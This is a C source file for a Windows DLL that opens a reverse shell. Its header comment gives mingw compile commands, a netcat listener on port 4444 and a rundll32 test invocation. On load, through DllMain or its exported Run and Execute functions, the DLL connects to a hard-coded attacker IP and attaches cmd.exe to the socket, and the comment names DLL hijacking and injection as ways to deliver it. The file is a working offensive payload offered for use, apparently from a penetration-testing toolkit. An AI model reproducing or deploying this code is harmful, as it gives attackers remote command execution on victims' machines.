/*
 * Reverse Shell DLL — TCP callback shell
 *
 * When loaded (via DLL hijack, injection, or rundll32), connects back
 * to the attacker's listener and spawns cmd.exe.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o revshell.dll dll_revshell.c -lws2_32
 *   i686-w64-mingw32-gcc -shared -o revshell32.dll dll_revshell.c -lws2_32
 *
 * Listener:
 *   nc -lvnp 4444
 *   rlwrap nc -lvnp 4444  (with readline support)
 *
 * Test:
 *   rundll32.exe revshell.dll,Run
 *
 * CHANGE THESE before compiling:
 */
#define ATTACKER_IP   "10.10.14.1"
#define ATTACKER_PORT  4444

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void ReverseShell(void) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
}

__declspec(dllexport) void Run(void) {
    ReverseShell();
}

__declspec(dllexport) void Execute(void) {
    ReverseShell();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShell, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
